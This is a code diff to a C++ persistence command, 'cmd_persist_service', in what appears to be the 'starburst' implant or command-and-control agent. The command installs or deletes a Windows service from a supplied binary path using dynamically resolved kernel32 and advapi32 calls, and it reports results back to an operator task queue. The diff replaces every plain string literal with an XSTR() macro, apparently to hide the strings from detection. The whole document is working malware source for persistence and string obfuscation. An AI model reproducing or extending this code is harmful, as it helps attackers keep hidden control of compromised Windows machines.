@@ -26,7 +26,7 @@ auto declfn starburst::cmd_persist_service(
 
     if ( !action_str || action_len == 0 || !name_str || name_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need action and name" ) ) );
+            XSTR( "need action and name" ) );
         return;
     }
 
@@ -50,12 +50,12 @@ auto declfn starburst::cmd_persist_service(
     inst.kernel32.MultiByteToWideChar( CP_ACP, 0, binpath_buf, -1, w_binpath, 512 );
 
     bool is_install = str_cmp( action_buf,
-        symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;
+        XSTR( "install" ) ) == 0;
 
     if ( is_install ) {
         if ( !binpath_str || binpath_len == 0 ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "install requires binary_path" ) ) );
+                XSTR( "install requires binary_path" ) );
             return;
         }
 
@@ -63,7 +63,7 @@ auto declfn starburst::cmd_persist_service(
             nullptr, nullptr, SC_MANAGER_CREATE_SERVICE );
         if ( !hSCM ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "OpenSCManagerW failed" ) ) );
+                XSTR( "OpenSCManagerW failed" ) );
             return;
         }
 
@@ -81,7 +81,7 @@ auto declfn starburst::cmd_persist_service(
         if ( !hService ) {
             inst.advapi32.CloseServiceHandle( hSCM );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "CreateServiceW failed" ) ) );
+                XSTR( "CreateServiceW failed" ) );
             return;
         }
 
@@ -89,8 +89,7 @@ auto declfn starburst::cmd_persist_service(
         inst.advapi32.CloseServiceHandle( hSCM );
 
         char out[320] = { 0 };
-        str_copy( out, symbol<char*>( const_cast<char*>(
-            "Service created: " ) ) );
+        str_copy( out, XSTR("Service created: ") );
         uint32_t off = str_len( out );
         memory::copy( out + off, name_buf, str_len( name_buf ) );
         queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
@@ -100,7 +99,7 @@ auto declfn starburst::cmd_persist_service(
             nullptr, nullptr, SC_MANAGER_ALL_ACCESS );
         if ( !hSCM ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "OpenSCManagerW failed" ) ) );
+                XSTR( "OpenSCManagerW failed" ) );
             return;
         }
 
@@ -109,7 +108,7 @@ auto declfn starburst::cmd_persist_service(
         if ( !hService ) {
             inst.advapi32.CloseServiceHandle( hSCM );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "OpenServiceW failed" ) ) );
+                XSTR( "OpenServiceW failed" ) );
             return;
         }
 
@@ -119,14 +118,13 @@ auto declfn starburst::cmd_persist_service(
 
         if ( deleted ) {
             char out[320] = { 0 };
-            str_copy( out, symbol<char*>( const_cast<char*>(
-                "Service deleted: " ) ) );
+            str_copy( out, XSTR("Service deleted: ") );
             uint32_t off = str_len( out );
             memory::copy( out + off, name_buf, str_len( name_buf ) );
             queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
         } else {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "DeleteService failed" ) ) );
+                XSTR( "DeleteService failed" ) );
         }
     }
 }
